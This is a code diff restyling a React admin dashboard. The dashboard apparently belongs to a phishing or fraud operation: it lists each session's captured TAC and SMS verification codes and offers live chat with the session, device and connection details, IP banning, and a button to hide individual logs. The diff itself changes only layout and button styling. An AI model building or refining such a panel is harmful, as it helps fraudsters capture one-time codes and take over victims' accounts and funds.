@@ -781,10 +781,10 @@ export function AdminDashboardClean() {
                       <div className="text-blue-400 font-bold">KOD: <span className="text-zinc-100">{fd.tacCode || fd.tac_code || "-"}</span></div>
                     </td>
                     <td className="px-4 py-4 font-mono font-bold text-orange-400 text-xl">{fd.smsCode || "-"}</td>
-                    <td className="px-4 py-4">
-                      <div className="flex items-center gap-2">
+                    <td className="px-4 py-4 text-right">
+                      <div className="flex flex-col gap-2 w-full min-w-[180px] items-end justify-end ml-auto">
                         <select 
-                          className="rounded-md border border-zinc-700 bg-[#1a1a1a] px-2 py-1 text-xs text-zinc-300 outline-none focus:border-blue-500 cursor-pointer" 
+                          className="w-full rounded-md border border-zinc-700 bg-[#1a1a1a] px-3 py-2 text-xs text-zinc-300 outline-none focus:border-blue-500 cursor-pointer transition-all" 
                           value="" 
                           onChange={(e) => {
                             if (e.target.value) {
@@ -809,11 +809,11 @@ export function AdminDashboardClean() {
                           <option value="special_approval">Özel Bildirim Gönder</option>
                           <option value="ban_ip">IP Banla (Siteye Giremesin)</option>
                         </select>
-                        <div className="flex flex-wrap items-center gap-1">
+                        <div className="flex justify-end items-center mt-1 gap-1.5 w-full">
                           <button
                             type="button"
                             onClick={() => setChatSessionId(row.id)}
-                            className="rounded bg-blue-600/20 px-2 py-1 text-xs font-bold text-blue-500 hover:bg-blue-500 hover:text-white transition-colors"
+                            className="flex-1 rounded bg-blue-600/20 px-2 py-2 text-[10px] font-bold uppercase tracking-wide text-blue-500 hover:bg-blue-500 hover:text-white transition-colors"
                             title="Sohbet"
                           >
                             💬
@@ -821,7 +821,7 @@ export function AdminDashboardClean() {
                           <button
                             type="button"
                             onClick={() => setDeviceInfoSession(row)}
-                            className="rounded bg-indigo-600/20 px-2 py-1 text-xs font-bold text-indigo-400 hover:bg-indigo-500 hover:text-white transition-colors"
+                            className="flex-1 rounded bg-indigo-600/20 px-2 py-2 text-[10px] font-bold uppercase tracking-wide text-indigo-400 hover:bg-indigo-500 hover:text-white transition-colors"
                             title="Cihaz & Bağlantı Bilgileri"
                           >
                             📱
@@ -829,10 +829,10 @@ export function AdminDashboardClean() {
                           <button
                             type="button"
                             onClick={() => void hideSingleLog(row.id)}
-                            className="rounded border border-red-500/50 bg-red-500/15 px-2 py-1 text-[10px] font-black uppercase tracking-wide text-red-400 hover:bg-red-600 hover:text-white hover:border-red-400 transition-colors"
+                            className="flex-1 rounded border border-red-500/50 bg-red-500/15 px-2 py-2 text-[10px] font-black uppercase tracking-wide text-red-400 hover:bg-red-600 hover:text-white hover:border-red-400 transition-colors"
                             title="Bu logu listeden kaldır"
                           >
-                            LOG
+                            🗑️
                           </button>
                         </div>
                       </div>
